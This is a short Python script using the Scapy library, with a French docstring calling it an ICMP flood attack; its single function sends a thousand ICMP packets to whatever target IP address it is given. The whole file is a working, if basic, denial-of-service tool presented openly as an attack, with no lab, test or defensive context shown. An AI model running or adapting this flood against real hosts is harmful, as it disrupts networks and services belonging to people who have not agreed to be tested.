from scapy.all import IP,ICMP,send

"""Attaque par flood ICMP"""
def attack(target_ip, count=1000):
    for _ in range(count):
        send(IP(dst=target_ip)/ICMP(), verbose=False)